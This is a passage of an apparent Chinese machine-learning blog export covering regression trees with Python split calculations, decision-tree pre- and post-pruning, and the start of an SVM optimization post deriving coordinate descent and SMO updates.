\\tag{4-3} \\] 其中\\(c_1,c_2\\)为对应的R1,R2部分的均值。 \\[ \\hat c_m = {1\\over N_m}\\sum_{x_i\\in R_m(j,s)}y_i , \\quad x\\in R_m , m=1,2 \\] 根据划分的区域递归的继续进行划分，最后就得到了回归树。 回归树例子 假设数据的特征就一个（就不用比较各个特征了），数据如下： x 1 2 3 4 5 6 7 8 9 10 y 5.56 5.70 5.91 6.40 6.80 7.05 8.90 8.70 9.00 9.05 可以考虑划分点{1.5,2.5,3.5,4.5,5.5,6.5,7.5,8.5,9.5}，以s = 1.5为例，此时对应的c1= 5.56, c2=7.50 这里开挂用python代码计算剩下的： 1234567891011121314151617181920212223242526import numpy as npdata = np.array([5.56, 5.70, 5.91, 6.40, 6.80, 7.05, 8.90, 8.70, 9.00, 9.05])for k in range(len(data) - 1): left = data[:k + 1] right = data[k + 1:] left_mean = left.mean() right_mean = right.mean() left_error = np.sum([(left_mean - x) ** 2 for x in left]) right_error = np.sum([(right_mean - x) ** 2 for x in right]) mean_error = (left_error + right_error) print(k + 1.5, left, right, &#x27;mean_error=&#123;0:5.2f&#125; c1=&#123;1:5.2f&#125; c2=&#123;2:5.2f&#125;&#x27;.format(mean_error, left_mean, right_mean))&quot;&quot;&quot;1.5 [ 5.56] [ 5.7 5.91 6.4 6.8 7.05 8.9 8.7 9. 9.05] mean_error=15.72 c1= 5.56 c2= 7.502.5 [ 5.56 5.7 ] [ 5.91 6.4 6.8 7.05 8.9 8.7 9. 9.05] mean_error=12.08 c1= 5.63 c2= 7.733.5 [ 5.56 5.7 5.91] [ 6.4 6.8 7.05 8.9 8.7 9. 9.05] mean_error= 8.37 c1= 5.72 c2= 7.994.5 [ 5.56 5.7 5.91 6.4 ] [ 6.8 7.05 8.9 8.7 9. 9.05] mean_error= 5.78 c1= 5.89 c2= 8.255.5 [ 5.56 5.7 5.91 6.4 6.8 ] [ 7.05 8.9 8.7 9. 9.05] mean_error= 3.91 c1= 6.07 c2= 8.546.5 [ 5.56 5.7 5.91 6.4 6.8 7.05] [ 8.9 8.7 9. 9.05] mean_error= 1.93 c1= 6.24 c2= 8.917.5 [ 5.56 5.7 5.91 6.4 6.8 7.05 8.9 ] [ 8.7 9. 9.05] mean_error= 8.01 c1= 6.62 c2= 8.928.5 [ 5.56 5.7 5.91 6.4 6.8 7.05 8.9 8.7 ] [ 9. 9.05] mean_error=11.74 c1= 6.88 c2= 9.039.5 [ 5.56 5.7 5.91 6.4 6.8 7.05 8.9 8.7 9. ] [ 9.05] mean_error=15.74 c1= 7.11 c2= 9.05&quot;&quot;&quot; 可以看出，选6.5的时候最小，因此选6.5作为划分点。因此得到回归树\\(T_1\\)为： \\[ T_1(x) = \\begin{cases} 6.24, &amp; x\\le 6.5 \\\\ 8.91, &amp; x \\gt 6.5 \\\\ \\end{cases} \\] 接下来对\\(R_1\\)和\\(R_2\\)区域做同样的操作直到达到终止条件即可。 假如树的深度多允许为2，则最后的回归树为 decision-tree-partition-space-example PS: 使用下面的代码生成 1234567891011121314151617181920import numpy as npfrom sklearn.tree import DecisionTreeRegressorX = np.arange(1, 11).reshape(-1, 1)y = np.array([5.56, 5.70, 5.91, 6.40, 6.80, 7.05, 8.90, 8.70, 9.00, 9.05])tree = DecisionTreeRegressor(max_depth=2).fit(X, y)# import os # os.environ[&quot;PATH&quot;] += os.pathsep + &#x27;C:/Program Files (x86)/Graphviz2.38/bin/&#x27;from sklearn.externals.six import StringIO from IPython.display import Image from sklearn.tree import export_graphvizimport pydotplusdot_data = export_graphviz(tree, out_file=None, filled=True, rounded=True, special_characters=True)graph = pydotplus.graph_from_dot_data(dot_data) Image(graph.create_png()) 回归树的空间划分 在上面的例子中，可以画出对应的回归为： decision-tree-partition-space 对应的python代码为 123456789import matplotlib.pyplot as pltplt.figure()plt.scatter(X, y, s=20, edgecolor=&quot;black&quot;, c=&quot;darkorange&quot;, label=&quot;data&quot;)plt.plot(X, tree.predict(X), color=&quot;cornflowerblue&quot;, label=&quot;regression tree&quot;, linewidth=2)plt.xlabel(&quot;X&quot;)plt.ylabel(&quot;Y&quot;)plt.title(&quot;Decision Tree Regression&quot;)plt.legend()plt.show() 可以看出，一个回归树对应着输入空间（特征空间）的一个划分以及在划分的单元上的输出值。上图就是对输入空间X的划分。假设已经将输入空间划分为K个单元\\(R_1, R_2, \\ldots, R_K\\), 在每个单元\\(R_k\\)上有个固定的输出\\(c_k\\),则回归树可以表示为: \\[ f(\\mathbf{X}) = \\sum_{k=1}^K c_k I(\\mathbf{X} \\in R_k) \\tag{4-4} \\] 式4-4就是回归树比较数学的表示方法。比如上面的例子，\\(x\\in (3.5,6.5]\\)时值就是6.75。可以看出各个划分空间是不相交的。 当输入空间的划分确定时，可以用平方误差\\(\\sum_{x_i \\in R_k}(y_i - f(x_i))^2\\)来表示回归树对于训练数据的预测误差，显然，单元\\(R_k\\)上的\\(c_k\\)的k最优值是\\(R_k\\)上所有输入实例\\(x_i\\)对应的\\(y_i\\)的均值。 决策树剪枝 决策树的生成算法递归的产生决策树，直到满足终止条件位置。产生的决策树可能过于复杂，对训练数据分类准确，但是对未知样本可能准确性不高。换句话说，决策树算法容易过拟合。为了防止过拟合，可以通过剪枝算法来降低复杂度，减少过拟合的风险。 决策树剪枝算法的基本策略有”预剪枝“和”后剪枝“两种策略。基本思路是极小化损失函数。 预剪枝即在决策树生成过程中，对每个结点在划分前先进行估计，若当前结点的划分不能带来决策树泛化性能的提升，则停止划分当前结点，并标记为叶结点。 后剪枝是先从训练集生成一棵完整的决策树，然后自底向上地对非叶结点进行考察，若将该节点对应的子树替换为叶子结点能带来决策树的泛化性能提升，则将该子树替换为叶子结点。 上面的泛化性能考察，就要求我们对数据集划分，比如划分一部分为训练集，另一部分为验证集。然后考察在验证集上的准确率。 因此，我们划分出新的数据如下表，双线上部分为训练集，双线下部分为验证集 decision-tree-data-watermelon-2.0-train-and-validation-data 如果不经过剪枝，训练出来的决策树如下： decision-tree-example-no-pruning 假设采用信息增益作为划分依据，现在来看看预剪枝和后剪枝怎么做的。 预剪枝 在不剪枝的做法中，我们根据信息增益准则，选取信息增益最大的脐部特征来进行划分，并产生3个分支。 而在预剪枝的过程中，我们需要看用脐部进行划分是否能提升泛化性能。 若不划分，根结点被标记为叶子结点，类别为最多的类别，即设为正例”好瓜\"(这个训练集中正例=负例，因此随便选一类都可以)，则验证集的7个样本中有3个样本正确分类，因此，精度为3 / 7 * 100% = 42.9% 进行划分， 结点2，包含编号{1, 2, 3, 14} =&gt; 好瓜 结点3，包含编号{6, 7, 15, 17} =&gt;好瓜 结点4，包含编号{10, 16} =&gt;坏瓜 在测试集中，根据脐部特征的取值到相应的结点上，如编号4的验证数据为“凹陷”就到2号结点上，为好瓜。以此类推有{4，5，8，11，12}5个样本分类正确，因此精度为5 / 7 * 100% = 71.4% 因为划分后的精度(71.4%)比不划分的(42.9%)高，所以进行划分。 对之后的结点2，3，4是否划分采用类似的过程。最后的决策树如下图所示： decision-tree-example-pre-pruning 这是一棵只有一层划分的决策树，称为“决策树桩” （decision stump）。 预剪枝使得很多分支都没有展开，降低了过拟合的风险，也降低了决策树训练和预测的开销。但可能导致欠拟合。 后剪枝 后剪枝是作用在完整的决策树上的，因此我们先训练出一棵完整的决策树（即该小节一开始给的图）。 可以看出，验证集有{4, 11, 12}三个数据划分对了，因此精度为3/7=42.9%。 现在进行剪枝，先考察结点6，包含训练集{7, 15}，验证集{8，9}，若不剪枝为42.9%，若剪枝，则标记为好瓜，精度提高到57.1%，因此剪枝。 然后考察结点5，包含训练集{6, 7, 15}，验证集{8, 9}，若剪枝，则标记为好瓜，剪枝前后都是57.1%。根据奥卡姆剃刀原则，应选择简单的模型，因此应该进行剪枝。但是为了画图的直观，这里采用不剪枝的保守策略。 然后对于结点2，包含训练集{1, 2, 3, 14} ，验证集{4，5，13}，若进行剪枝，则标记为好瓜，精度提升到71.4%，因此剪枝。 对结点3和结点1做同样剪枝判断处理，但是精度并不提高，因此保留： 最后的决策树如下： decision-tree-example-post-pruning 小结 决策树的特点： 需要较少的数据预处理 支持类别特征 容易对模型进行解释和实现 缺点： 容易过拟合 拟合能力有限 和其他的方法比较： Decision Tree 可以很好的处理 missing feature，这是他的天然特性，因为决策树的每个节点只依赖一个 feature，如果某个 feature 不存在，这颗树依然可以拿来做决策，只是少一些路径。像逻辑回归，SVM 就没这个好处。 Decision Tree 可以很好的处理各种类型的 feature，也是天然特性，很好理解，同样逻辑回归和 SVM 没这样的天然特性。 对特征空间的 outlier 有鲁棒性，因为每个节点都是 x &lt; 𝑇 的形式，至于大多少，小多少没有区别，outlier 不会有什么大的影响，同样逻辑回归和 SVM 没有这样的天然特性。 如果有不相关的 feature，没什么干扰，如果数据中有不相关的 feature，顶多这个 feature 不出现在树的节点里。逻辑回归和 SVM 没有这样的天然特性(但是有相应的补救措施，比如逻辑回归里的 L1 正则化)。 数据规模影响不大，因为我们对弱分类器的要求不高，作为弱分类器的决策树的深 度一般设的比较小，即使是大数据量，也可以方便处理。像 SVM 这种数据规模大的时候训练会比较麻烦。 参考资料 《机器学习》 - 周志华 《统计学习方法》 - 李航 机器学习技法 - 林轩田 http://leijun00.github.io/2014/10/decision-tree-2/ https://cethik.vip/2016/09/21/machineCAST/","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"机器学习","slug":"study/机器学习","permalink":"https://www.hrwhisper.me/categories/study/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://www.hrwhisper.me/tags/Machine-Learning/"},{"name":"Machine Learning model","slug":"Machine-Learning-model","permalink":"https://www.hrwhisper.me/tags/Machine-Learning-model/"}]},{"title":"『我爱机器学习』深入理解SVM(四) – SVM优化算法","slug":"machine-learning-svm-optimization-algorithm-smo-pegasos","date":"2018-04-09T03:56:42.000Z","updated":"2020-10-19T14:35:48.808Z","comments":true,"path":"machine-learning-svm-optimization-algorithm-smo-pegasos/","link":"","permalink":"https://www.hrwhisper.me/machine-learning-svm-optimization-algorithm-smo-pegasos/","excerpt":"SVM系列终于要告一段落了，前面讲解了SVM的硬软边界，以及对偶问题。 现在讲解如何高效的对对偶问题进行求解。 包括 坐标下降法 SMO Pegasos (以后更新)","text":"SVM系列终于要告一段落了，前面讲解了SVM的硬软边界，以及对偶问题。 现在讲解如何高效的对对偶问题进行求解。 包括 坐标下降法 SMO Pegasos (以后更新) 坐标下降法 我们常用“梯度下降法” 来求解无约束优化问题，今天介绍另一种称为坐标下降法。 坐标下降法也是一种优化方法，它在每步迭代中固定一个坐标方向，通过不断循环使用不同的坐标方向来达到目标函数的局部极小值。 假设求解函数\\(f({\\bf x})\\)的极小值，其中\\({\\bf x} = (x_1,x_2,\\cdots,x_d)\\)是一个d维向量，坐标下降法的步骤如下： 选择一个分量如 \\(x_0\\)，固定除\\(x_0\\)以外的其他维度, 以 \\(x_0\\)为自变量，求使得 f 取得最小值的 \\(x_0\\) 循环执行步骤1，直到f的值不再变化或变化很小 与梯度下降法类似，通过迭代执行，最后会收敛到期望的局部极小值点或驻点(stationary point)。 例如，\\(f(x ,y) = 5x^2 - 6xy+5y^2\\)，这里我们利用坐标下降求解。 假设首先首先位于固定x， 初始点于(-1,-1)，可以求解一元二次方程：求导得\\(\\frac{\\partial f}{y} = -6x + 10y = 0 \\Rightarrow y=\\frac{6}{10}x\\)，因此新的坐标为(-1, -0.6) 固定y，求导得\\(\\frac{\\partial f}{y} = 10x - 6y = 0 \\Rightarrow x=\\frac{6}{10}y\\)，因此新坐标为(-0.36, -0.6) 下图为坐标下降的过程： coordinate-descent 可以看出，因为每次只优化一个变量，每次迭代的方向都是沿着坐标轴方向。 坐标下降法不需要计算梯度，每步迭代中仅需求解一维搜索问题，对于某些复杂问题计算较为简便。但若目标函数不光滑，则坐标下降法可能陷入非驻点(non-stationary point)。 coordinate-descent-non-stationary-point 与梯度下降法对比 一次更新:\\(w^{t+1} \\leftarrow w^t + \\Delta w^t\\) 梯度下降：沿梯度最大的的方向同时更新\\(w_1\\)和\\(w_2\\) 坐标轴下降：选择一个变量，沿坐标轴方向更新\\(w_1\\)或\\(w_2\\) 坐标轴下降将一个多变量优化问题转化为一系列单变量优化问题 coordinate-descent-vs-gradient-descent SMO 回顾一下软间隔+核函数SVM问题： \\[ \\begin{align*} \\max_{ {\\boldsymbol \\alpha} }\\hspace{2ex}&amp; \\sum_{i=1}^n\\alpha_i - \\frac{1}{2}\\sum_{i=1}^n\\sum_{j=1}^n\\alpha_i\\alpha_jy_iy_jK( \\bf{x_i, x_j}) \\tag{2-1}\\\\ {\\rm s.t.} \\hspace{2ex} &amp; \\sum_{i=1}^n\\alpha_iy_i =0\\\\ \\hspace{2ex} &amp; 0 \\le \\alpha_i \\le C, \\hspace{2ex} i=1,2,\\cdots m \\end{align*} \\] 而对样本x的预测为： \\(f(x) = \\sum_{i=1}^{n}\\alpha_{i}y_{i} K(x_{i}, x) + b\\) 前面提到过，对偶问题有n个变量，因为每个样本都有一个\\(\\alpha_i\\)。当数据量很大的时候，求解效率不高。 这也是SMO算法提出的动机。SMO全名为Sequential minimal optimization，翻译为中文就是序列最小化。SMO算法由Platt在1998年提出，并成为最快的二次规划优化算法，特别针对线性SVM和数据稀疏时性能更优。 SMO的原理是: 如果所有变量的解都满足此最优化问题的KKT条件，那么这个最优化问题的解就得到了。因为KKT条件是该最优化问题的充分必要条件[Osuna et al 1997].。因此，SMO中，每次选取的为一对变量\\((\\alpha_i,\\alpha_j)\\), 而其它变量固定。这样，参数初始化后，SMO不断执行如下两个步骤直到收敛： 选取一对需要更新的变量\\(\\alpha_i\\)和\\(\\alpha_j\\) 固定\\(\\alpha_i\\)和\\(\\alpha_j\\)外的参数，求解2-1获得更新后的\\(\\alpha_i\\)和\\(\\alpha_j\\) 可以看出，SMO算法的做法和坐标下降法类似，只不过SMO中，每次选取的为一对变量\\((\\alpha_i,\\alpha_j)\\), 而坐标下降为一个。因为SVM中，\\(\\alpha\\)并非完全独立，而是有约束的（\\(\\sum_{i=1}^n\\alpha_iy_i =0\\) ），因此若一个\\(\\alpha\\)改变，另一个也要随之变化以满足约束条件。 直观上看，KKT条件违背的程度越大，则变量更新后可能导致的目标函数值减幅越大。因此第一个变量选择违背KKT条件程度最大的变量，第二个变量则选择使目标函数减少最快的变量。具体的过程之后再讲。现在先讲假设已经选择了变量，然后我们来看看接下来怎么做。 获得未修剪的原始解 假设选择两个变量为\\(\\alpha_1\\)和\\(\\alpha_2\\)，其余变量\\(\\alpha_3, \\alpha_4,\\cdots,\\alpha_n\\)均固定（当作常数），于是式2-1的子问题可以写成： \\[ \\begin{align*} \\max_{ {\\boldsymbol \\alpha} }\\hspace{2ex}&amp; \\alpha_1 + \\alpha_2 - \\frac{1}{2}\\alpha_1^2K_{11} - \\frac{1}{2}\\alpha_2^2K_{22}-\\alpha_1\\alpha_2y_1y_2K_{12} - \\alpha_1y_1\\sum_{i=3}^n\\alpha_iy_iK_{i1}-\\alpha_2y_2 \\sum_{i=3}^n\\alpha_iy_iK_{i2}\\tag{2-2}\\\\ {\\rm s.t.} \\hspace{2ex} &amp;\\alpha_{1}y_{1} + \\alpha_{2}y_{2} = -\\sum_{i=3}^{n}\\alpha_{i}y_{i} = \\zeta\\\\ \\hspace{2ex} &amp; 0 \\le \\alpha_i \\le C, \\hspace{2ex} i=1,2 \\end{align*} \\] 上面的目标函数中，就是展开包含\\(\\alpha_1, \\alpha_2\\)的项，把其余不包括\\(\\alpha_1, \\alpha_2\\)的可以看成常数项的去掉得到的。并对\\(y_iy_i = 1\\)进行了化简。另外简写核函数\\(K_{ij} = K({\\bf x_i, x_j})\\) 第一个约束条件就是进行移项，\\(\\alpha_1y_1 + \\alpha_2y_2\\)等于常数\\(\\zeta\\) 由于我们只考虑\\(\\alpha_1\\)和\\(\\alpha_2\\)，因此第二个限制条件i只取1或2。 接着我们来做一些推导， 引进记号 \\[ v_{i} = \\sum_{j=3}^{n}\\alpha_{j}y_{j}K_{ij} = f(x_{i}) - \\sum_{j=1}^{2}\\alpha_{j}y_{j}K_{ij} - b, \\hspace{2ex} i=1,2\\tag{2-3} \\] 将2-3带入2-2的目标函数，则目标函数可以写成 \\[ W(\\alpha_1,\\alpha_2) =\\alpha_1 + \\alpha_2 - \\frac{1}{2}\\alpha_1^2K_{11} - \\frac{1}{2}\\alpha_2^2K_{22}-\\alpha_1\\alpha_2y_1y_2K_{12} - \\alpha_1y_1v_1-\\alpha_2y_2 v_2\\tag{2-4} \\] 另外看看第一个约束条件： \\[ \\begin{align*} \\alpha_{1}y_{1} &amp; = \\zeta - \\alpha_{2}y_{2} \\\\ \\alpha_{1} &amp; = \\zeta y_{1} - \\alpha_{2}y_{2}y_{1} \\hspace{2ex} 两边同时乘以y_1\\tag{2-5} \\end{align*} \\] 将2-5带入2-4，就消去了\\(\\alpha_1\\)，得到\\(\\alpha_2\\)的目标函数: \\[ \\begin{align*} W(\\alpha_2) =&amp;\\zeta y_{1} - \\alpha_{2}y_{2}y_{1} + \\alpha_2 - \\frac{1}{2}(\\zeta y_{1} - \\alpha_{2}y_{2}y_{1})^2K_{11} - \\frac{1}{2}\\alpha_2^2K_{22} - (\\zeta y_{1} - \\alpha_{2}y_{2}y_{1})\\alpha_2y_1y_2K_{12} \\\\&amp; - (\\zeta y_{1} - \\alpha_{2}y_{2}y_{1})y_1v_1-\\alpha_2y_2 v_2 \\\\=&amp;(\\zeta- \\alpha_{2}y_{2} )y_1 + \\alpha_2 -\\frac{1}{2}K_{11}(\\zeta - \\alpha_{2}y_{2})^2 - \\frac{1}{2}K_{22}\\alpha_2^2 - y_2K_{12}(\\zeta - \\alpha_{2}y_{2})\\alpha_2 \\\\&amp; - v_1(\\zeta - \\alpha_{2}y_{2}) - y_2 v_2\\alpha_2\\tag{2-4} \\end{align*} \\] 对\\(\\alpha_2\\)求导数，得： \\[ \\begin{align*} \\frac{\\partial w}{\\partial \\alpha_2} &amp;= -y_1y_2+1 + (\\zeta - \\alpha_{2}y_{2})y_2K_{11} - K_{22}\\alpha_2 - y_2K_{12} (\\zeta - \\alpha_{2}y_{2})+ y_2y_2K_{12}\\alpha_2 +y_2v_1 - y_2v_2 \\\\&amp; = -y_1y_2 + 1 +y_2\\zeta K_{11} - K_{11}\\alpha_2 - K_{22}\\alpha_2-y_2K_{12}\\zeta+2K_{12}\\alpha_2 + y_2v_1 - y_2v_2 \\end{align*} \\] 令其为0，整理得到 \\[ \\begin{align*} (K_{11} + K_{22} -2K_{12})\\alpha_2 &amp;= -y_1y_2 + 1 +y_2\\zeta K_{11} -y_2K_{12}\\zeta+ y_2v_1 - y_2v_2\\\\ &amp;=y_2(-y_1 + y_2 +\\zeta K_{11} -\\zeta K_{12}+ v_1 - v_2)\\tag{2-5} \\end{align*} \\] 此外，将\\(\\alpha_{1}^{old} = \\zeta y_{1} - \\alpha_{2}^{old} y_{2}y_{1}\\)代入\\(v_1 - v_2\\)，得到 \\[ \\begin{align*} v_1 - v_2 &amp;= \\left( f(x_{1}) - \\sum_{j=1}^{2}\\alpha_{j}y_{j}K_{1j} - b\\right) - \\left( f(x_{2}) - \\sum_{j=1}^{2}\\alpha_{j}y_{j}K_{2j} - b\\right)\\\\ &amp;= f(x_{1}) - f(x_{2}) - \\sum_{j=1}^{2}\\alpha_{j}y_{j}K_{1j} +\\sum_{j=1}^{2}\\alpha_{j}y_{j}K_{2j} \\\\ &amp;= f(x_{1}) - f(x_{2}) - (\\zeta - \\alpha_2^{old}y_2)K_{11} - \\alpha_2^{old}y_2K_{12} + (\\zeta-\\alpha_2^{old}y_2)K_{12} +\\alpha_2^{old}y_2K_{22} \\\\ &amp;= f(x_{1}) - f(x_{2}) - \\zeta K_{11}+ \\alpha_2^{old}y_2K_{11} -2 \\alpha_2^{old}y_2K_{12} + \\zeta K_{12}+\\alpha_2^{old}y_2K_{22} \\tag{2-6} \\end{align*} \\] 将2-6带入2-5, 并令\\(E_i = f(x_i) - y_i\\)表示SVM预测值与真实值误差： \\[ \\begin{align*} (K_{11} + K_{22} -2K_{12})\\alpha_2^{\\rm new, unclipped} = &amp;y_2(-y_1 + y_2 +\\zeta K_{11} -\\zeta K_{12} \\\\&amp;+ f(x_{1}) - f(x_{2}) - \\zeta K_{11} + \\alpha_2^{old}y_2K_{11} -2 \\alpha_2^{old}y_2K_{12} + \\zeta K_{12}+\\alpha_2^{old}y_2K_{22}) \\\\ =&amp;\\ y_2(-y_1 + y_2 + f(x_{1}) - f(x_{2}) + \\alpha_2^{old}y_2K_{11} -2 \\alpha_2^{old}y_2K_{12}+\\alpha_2^{old}y_2K_{22}) \\\\ =&amp;\\ y_2(-y_1 + y_2 + f(x_{1}) - f(x_{2})) + \\alpha_2^{old}K_{11} -2 \\alpha_2^{old}K_{12}+\\alpha_2^{old}K_{22} \\\\ =&amp;\\ y_2(-y_1 + y_2 + f(x_{1}) - f(x_{2}) ) + (K_{11}+K_{22} -2 K_{12}) \\alpha_2^{old}\\\\ =&amp;\\ y_2(E_1 - E_2) + (K_{11}+K_{22} -2 K_{12}) \\alpha_2^{old} \\end{align*} \\] 令\\(\\eta = K_{1 1} + K_{22} - 2K_{12}\\)得： \\[ \\begin{align*} \\alpha_2^{\\rm new, unclipped} =&amp; \\alpha_2^{old}+ \\frac{y_2(E_1 - E_2) }{(K_{11} + K_{22} -2K_{12})}\\\\ =&amp; \\alpha_2^{old}+ \\frac{y_2(E_1 - E_2) }{\\eta}\\tag{2-7} \\end{align*} \\] 修剪原始解 上面我们得到了未经修剪的原始解: \\[ \\begin{align*} \\alpha_2^{\\rm new, unclipped} = \\alpha_2^{old}+ \\frac{y_2(E_1 - E_2) }{\\eta} \\end{align*} \\] 但是在SVM中需要满足限制条件: \\[ \\alpha_{1}y_{1} + \\alpha_{2}y_{2} = -\\sum_{i=3}^{n}\\alpha_{i}y_{i} = \\zeta\\\\ 0 \\le \\alpha_i \\le C, \\hspace{2ex} i=1,2 \\] 第二个限制条件将其限制在正方形区域中，而第一个限制条件则为一条直线。根据\\(y_1\\)是否等于\\(y_2\\)的关系可以得到下图： smo-restrict-condition 以左边的图为例，当\\(y_1\\ne y_2\\)时，\\(\\alpha_1^{old} -\\alpha_2^{old} = \\zeta y_1 = k\\), 可以看出-k为截距，因此下界L和上界H可以表示为： \\[ \\begin{align*} L = &amp;\\max(0, \\alpha_2^{old} - \\alpha_1^{old})\\\\ H = &amp;\\min(C, C + \\alpha_2^{old} - \\alpha_1^{old}) \\end{align*} \\] 右边的类似，当\\(y_1= y_2\\)时，\\(\\alpha_1^{old} +\\alpha_2^{old} = \\zeta y_1 = k\\), 可以看出k为截距，因此下界L和上界H可以表示为： \\[ \\begin{align*} L = &amp; \\max(0, \\alpha_1 ^{old}+ \\alpha_2^{old} - C )\\\\ H = &amp;\\min(C, \\alpha_1^{old} + \\alpha_2^{old} ) \\end{align*} \\] 通过上下界，就可以得到修剪后的\\(\\alpha_2^{\\rm new}\\) \\[ \\alpha_{2}^{\\rm new} = \\begin{cases} H &amp; \\alpha_{2}^{\\rm new, unclipped}&gt; H \\\\ \\alpha_{2}^{\\rm new, unclipped} &amp; L \\le \\alpha_{2}^{\\rm new, unclipped} \\le H \\\\ L &amp; \\alpha_{2}^{\\rm new, unclipped} &lt; L \\end{cases}\\tag{2-8} \\] 得到了\\(\\alpha_2^{\\rm new}\\)后就可以根据\\(\\alpha_{1}^{\\rm old}y_{1} + \\alpha_{2}^{\\rm old}y_{2} = \\alpha_{1}^{\\rm new}y_{1} + \\alpha_{2}^{\\rm new}y_{2}\\)得到\\(\\alpha_1^{\\rm new}\\) \\[ \\alpha_{1}^{\\rm new} = \\alpha_{1}^{\\rm old} + y_{1}y_{2}(\\alpha_{2}^{\\rm old} - \\alpha_{2}^{\\rm new}) \\tag{2-9} \\] b值更新 当完成一对\\(\\alpha_i, \\alpha_j\\)更新之后需要重新计算参数b，因为b关系到我们f(x)的计算，进而关系到之后计算误差E。 前面提到过，当\\(0 \\lt \\alpha_1^{\\rm new} \\lt C\\)时，此时为支持向量， 有\\(y_1({\\bf w^Tx_1}+b) = 1\\)，两边同时乘上\\(y_1\\)可以得到： \\[ \\begin{align*} b_1^{\\rm new} &amp;= y_1 - {\\bf w^Tx_1}\\\\ &amp;= y_1 - \\sum_{i=1}^n\\alpha_iy_iK_{i1}\\\\ &amp;= y_1 - \\sum_{i=3}^n\\alpha_iy_iK_{i1} - \\alpha_1^{\\rm new}y_1K_{11} - \\alpha_2^{\\rm new}y_2K_{21} \\tag{2-10} \\end{align*} \\] 又因为 \\[ \\begin{align*} E_1 &amp;= f(x_1) - y_1 \\\\ &amp;= {\\bf w^Tx_1}+b^{\\rm old} - y_1 \\\\ &amp; =\\sum_{i=1}^n\\alpha_iy_iK_{i1} +b^{\\rm old} - y_1 \\\\ &amp;= \\alpha_1^{\\rm old}y_1K_{11} + \\alpha_2^{\\rm old}y_2K_{21} + \\sum_{i=3}^n\\alpha_iy_iK({\\bf x_i},{\\bf x_1}) +b^{\\rm old}- y_1 \\end{align*} \\] 于是2-10前两项可以写为： \\[ y_1 - \\sum_{i=3}^n\\alpha_iy_iK({\\bf x_i},{\\bf x_1}) = \\alpha_1^{\\rm old}y_1K_{11} + \\alpha_2^{\\rm old}y_2K_{21} +b^{\\rm old}- E_1 \\] 带入2-10得： \\[ \\begin{align*} b_1^{\\rm new} &amp;= \\alpha_1^{\\rm old}y_1K_{11} + \\alpha_2^{\\rm old}y_2K_{21} +b^{\\rm old}- E_1- \\alpha_1^{\\rm new}y_1K_{11} - \\alpha_2^{\\rm new}y_2K_{21} \\\\ &amp;= (\\alpha_1^{\\rm old} - \\alpha_1^{\\rm new})y_1K_{11} + (\\alpha_2^{\\rm old} - \\alpha_2^{\\rm new})y_2K_{21} + b^{\\rm old} -E_1\\tag{2-11} \\end{align*} \\] 同样，若\\(0 \\lt \\alpha_2^{\\rm new} \\lt C\\)，有： \\[ \\begin{align*} b_2^{\\rm new} &amp;= (\\alpha_1^{\\rm old} - \\alpha_1^{\\rm new})y_1K_{12} + (\\alpha_2^{\\rm old} - \\alpha_2^{\\rm new})y_2K_{22} + b^{\\rm old} -E_2\\tag{2-12} \\end{align*} \\] 如果\\(\\alpha_1^{\\rm new},\\alpha_2^{\\rm new}\\)同时满足\\(0 \\lt \\alpha_1^{\\rm new} \\lt C ;\\ 0 \\lt \\alpha_2^{\\rm new} \\lt C\\)，则\\(b_1^{\\rm new} = b_2^{\\rm new}\\) 如果\\(\\alpha_1^{\\rm new},\\alpha_2^{\\rm new}\\)为0或者C,那么\\(b_1\\)和\\(b_2\\)以及它们之间的数都是满足KKT条件的阈值，这时候选它们的中点作为\\(b^{\\rm new} = \\frac{1}{2} (b_1^{\\rm new} + b_2^{\\rm new})\\) 更新完b之后，可以容易的得到\\(E_i\\)的值 \\[ E_i^{\\rm new} = \\sum_{s\\in support\\ vector}\\alpha_sy_sK_{si} +b^{\\rm new} - y_i \\tag{2-13} \\] 可以看到，SMO算法计算中，主要是2-7, 2-8, 2-9 , 2-11, 2-12, 2-13，并不依赖于数据量n，效率极高。 选取更新变量\\(\\alpha\\) OK，现在来讨论如何选择\\(\\alpha\\)更加细节的部分。 首先要明确的是： SMO算法在每个子问题中选择两个变量优化，其中至少一个变量是违反KKT条件的。 第1个变量的选择 SMO称选择第1个变量的过程为外层循环。 具体的，外层循环首先遍历所有满足条件\\(0 \\lt \\alpha_i \\lt C\\) 的样本点（即自由支持向量），检验其是否满足KKT条件，如果满足，那么遍历整个训练集，检验它们是否满足KKT条件。 这里优先遍历满足条件\\(0 \\lt \\alpha_i \\lt C\\) 的样本点，因为这些样本点更容易违反KKT条件。为什么呢？因为非支持向量(\\(\\alpha_i = 0\\))和受限支持向量(\\(\\alpha_i = C\\))对应的系数\\(\\alpha_i\\)一般不会更改。 如何判断满足KKT条件呢？就是根据互补松弛性\\(\\alpha_i(1 - \\xi_i - y_i({\\bf w^Tx_i}+b)) = 0; \\hspace{2ex} \\beta_i\\xi_i = 0\\)得出的下面几个判别式： \\[ \\begin{align*} \\alpha_i = 0 &amp; \\Leftrightarrow y_if(x_i) \\ge1 \\\\ 0 \\lt \\alpha_i \\lt C &amp;\\Leftrightarrow y_if(x_i) = 1 \\\\ \\alpha_i = C &amp; \\Leftrightarrow y_if(x_i) \\le 1 \\end{align*} \\] 以第2个为例，此时\\(0 \\lt\\alpha_i \\lt C\\) 可以根据 \\(C - \\alpha_i - \\beta_i = 0\\) 推出\\(\\beta_i \\gt 0 \\Rightarrow \\xi_i = 0\\)，因此\\(y_if(x_i) = 1\\)。 第2个变量选择 SMO称选择第2个变量为内层循环。假设在外层循环中已经找到第1个变量\\(\\alpha_1\\),现在要在内层循环中寻找第2个变量\\(\\alpha_2\\)。第2个变量选择的标准是希望能使\\(\\alpha_2\\)有尽可能大的变化。 式2-7\\(\\alpha_2^{\\rm new, unclipped} = \\alpha_2^{old}+ \\frac{y_2(E_1 - E_2) }{\\eta}\\)和式2-8告诉我们，是\\(\\alpha_2^{\\rm new}\\) 依赖于\\(|E_1 - E_2|\\)的。为了加快计算速度，一种简单的做法是选择\\(\\alpha_2\\)，使其对应的\\(|E_1 - E_2|\\)最大。为了节省计算时间，将所有\\(E_i\\)的值保存在一个列表中。 如果\\(E_1\\)是正的，选最小的\\(E_i\\)作为\\(E_2\\) 如果\\(E_1\\)是负的，选最大的\\(E_i\\)作为\\(E_2\\) 特殊情况下，比如\\(\\eta = K_{11} + k_{22} - 2k_{12} = 